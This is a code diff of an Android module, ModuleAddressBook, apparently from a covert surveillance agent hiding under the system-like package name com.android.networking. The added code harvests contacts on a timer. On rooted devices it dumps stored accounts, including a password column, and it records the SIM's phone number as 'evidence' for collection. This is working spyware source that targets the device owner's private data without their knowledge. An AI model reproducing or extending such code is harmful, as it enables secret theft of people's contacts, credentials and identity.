@@ -7,12 +7,21 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.ListIterator;
 
+import android.database.Cursor;
+
+import com.android.networking.Device;
+import com.android.networking.Sim;
+import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.crypto.Digest;
+import com.android.networking.db.RecordVisitor;
+import com.android.networking.evidence.EvidenceCollector;
 import com.android.networking.evidence.EvidenceType;
 import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
+import com.android.networking.interfaces.Observer;
+import com.android.networking.listener.ListenerSim;
 import com.android.networking.module.task.Contact;
 import com.android.networking.module.task.PhoneInfo;
 import com.android.networking.module.task.PickContact;
@@ -22,13 +31,19 @@ import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.WChar;
 
-public class ModuleAddressBook extends BaseModule {
+public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
+
+	public static final int PHONE = 0x08;
+	public static final int WHATSAPP = 0x07;
+	public static final int LOCAL = 0x80000000;
 
 	private PickContact contact;
 	Markup markupContacts;
 	HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
+
+	private String myPhone;
 
 	public ModuleAddressBook() {
 
@@ -48,6 +63,8 @@ public class ModuleAddressBook extends BaseModule {
 		setPeriod(180 * 60 * 1000);
 		setDelay(200);
 
+		ListenerSim.self().attach(this);
+
 		markupContacts = new Markup(this);
 
 		// the markup exists, try to read it
@@ -63,7 +80,7 @@ public class ModuleAddressBook extends BaseModule {
 					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
 				}
 			}
-		}else{
+		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart): no markup");
 			}
@@ -73,12 +90,71 @@ public class ModuleAddressBook extends BaseModule {
 		if (contacts == null) {
 			contacts = new HashMap<Long, Long>();
 			serializeContacts();
-		}else{
+		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart), got serialized contacs from markup: " + contacts.size());
 			}
 		}
 
+	}
+
+	/**
+	 * Every once and then read the contactInfo, and Check.every change. If
+	 * //$NON-NLS-1$ something is new the contact is saved.
+	 */
+	@Override
+	public void actualGo() {
+		try {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (go): Contacts");
+			}
+			
+			if (Status.self().haveRoot()) {
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (go): dumpAddressBookAccounts");
+				}
+				RecordVisitor addressVisitor = new RecordVisitor() {
+					
+					@Override
+					public long cursor(Cursor cursor) {
+						String jid = cursor.getString(0);
+						String name = cursor.getString(1);
+						String type = cursor.getString(2);
+						String password = cursor.getString(3);
+
+						int evId = ModulePassword.getServiceId(type);
+			
+						if (evId != 0)
+							createEvidenceLocal(evId, name);
+						
+						return 0;
+					}
+				};
+				ModulePassword.dumpAccounts(addressVisitor);
+								
+			}
+			
+			if (Cfg.ENABLE_CONTACTS && contacts()) {
+				serializeContacts();
+			}
+			
+
+		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (go) Error: " + ex);
+			}
+		}
+
+	}
+
+	@Override
+	public void actualStop() {
+		ListenerSim.self().detach(this);
 	}
 
 	/**
@@ -109,31 +185,6 @@ public class ModuleAddressBook extends BaseModule {
 		}
 	}
 
-	/**
-	 * Every once and then read the contactInfo, and Check.every change. If
-	 * //$NON-NLS-1$ something is new the contact is saved.
-	 */
-	@Override
-	public void actualGo() {
-		try {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): Contacts");
-			}
-			if (contacts()) {
-				serializeContacts();
-			}
-		} catch (Exception ex) {
-			if (Cfg.EXCEPTION) {
-				Check.log(ex);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go) Error: " + ex);
-			}
-		}
-
-	}
-
 	private boolean contacts() {
 		contact = new PickContact();
 
@@ -152,7 +203,7 @@ public class ModuleAddressBook extends BaseModule {
 		boolean needToSerialize = false;
 
 		final EvidenceReference log = new EvidenceReference(EvidenceType.ADDRESSBOOK);
-		
+
 		// for every Contact
 		while (iter.hasNext()) {
 			final Contact c = iter.next();
@@ -172,14 +223,14 @@ public class ModuleAddressBook extends BaseModule {
 					Check.log(TAG + " (go): new contact. " + c);//$NON-NLS-1$
 				}
 				contacts.put(c.getId(), crcNew);
-				
+
 				log.write(packet);
-				
+
 				needToSerialize = true;
-				//Thread.yield();
-			}						
+				Thread.yield();
+			}
 		}
-		
+
 		log.close();
 
 		if (Cfg.DEBUG) {
@@ -204,29 +255,19 @@ public class ModuleAddressBook extends BaseModule {
 		// List<WebsiteInfo> webInfo = c.getWebInfo();
 		final long uid = user.getUserId();
 		final String name = user.getCompleteName();
+		final String message = c.getInfo();
 
-		final int version = 0x01000000;
-
+		return preparePacket(uid, phoneInfo, name, message);
 		// final byte[] header = new byte[12];
 
-		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-		// Adding header
-		try {
-			outputStream.write(ByteArray.intToByteArray(0)); // size
-			outputStream.write(ByteArray.intToByteArray(version));
-			outputStream.write(ByteArray.intToByteArray((int) uid));
-		} catch (IOException ex) {
-			if (Cfg.EXCEPTION) {
-				Check.log(ex);
-			}
+	}
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (preparePacket) Error: " + ex);
-			}
+	private byte[] preparePacket(long uid, List<PhoneInfo> phoneInfo, String name, String message) {
+
+		final ByteArrayOutputStream outputStream = prepareHeader(uid, PHONE, 0);
+		if (outputStream == null) {
 			return null;
 		}
-
-		final String message = c.getInfo();
 
 		addTypedString(outputStream, (byte) 0x01, name);
 		if (phoneInfo.size() > 0) {
@@ -246,7 +287,30 @@ public class ModuleAddressBook extends BaseModule {
 		return payload;
 	}
 
-	private void addTypedString(ByteArrayOutputStream outputStream, byte type, String name) {
+	private static ByteArrayOutputStream prepareHeader(long uid, int program, int flags) {
+		final int version = 0x01000001;
+		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+		// Adding header
+		try {
+			outputStream.write(ByteArray.intToByteArray(0)); // size
+			outputStream.write(ByteArray.intToByteArray(version));
+			outputStream.write(ByteArray.intToByteArray((int) uid));
+			outputStream.write(ByteArray.intToByteArray(program));
+			outputStream.write(ByteArray.intToByteArray(flags));
+		} catch (IOException ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (preparePacket) Error: " + ex);
+			}
+			return null;
+		}
+		return outputStream;
+	}
+
+	private static void addTypedString(ByteArrayOutputStream outputStream, byte type, String name) {
 		if (name != null && name.length() > 0) {
 			final int header = (type << 24) | (name.length() * 2);
 
@@ -269,7 +333,48 @@ public class ModuleAddressBook extends BaseModule {
 	}
 
 	@Override
-	public void actualStop() {
+	public int notification(Sim b) {
+		Device device = Device.self();
+		myPhone = device.getPhoneNumber();
 
+		// final EvidenceReference log = new
+		// EvidenceReference(EvidenceType.ADDRESSBOOK);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notification) SIM: " + b.getImsi() + "Number: " + myPhone);//$NON-NLS-1$
+		}
+
+		if (Device.UNKNOWN_NUMBER.equals(myPhone)) {
+			if (Cfg.DEBUG) {
+				myPhone = "012345678";
+			} else {
+				return 0;
+			}
+		}
+
+		createEvidenceLocal(PHONE, myPhone);
+
+		return 0;
+	}
+
+	public static void createEvidenceLocal(int evId, String data) {
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (createEvidenceLocal) id: " + evId + " data: " + data);//$NON-NLS-1$
+		}
+
+		long uid = -evId;
+		final ByteArrayOutputStream outputStream = prepareHeader(uid, evId, LOCAL);
+		if (outputStream == null) {
+			return;
+		}
+
+		addTypedString(outputStream, (byte) 0x40, data);
+
+		byte[] payload = outputStream.toByteArray();
+		final int size = outputStream.size();
+		final DataBuffer db_header = new DataBuffer(payload, 0, 4);
+		db_header.writeInt(size);
+
+		EvidenceReference.atomic(EvidenceType.ADDRESSBOOK, null, payload);
 	}
 }
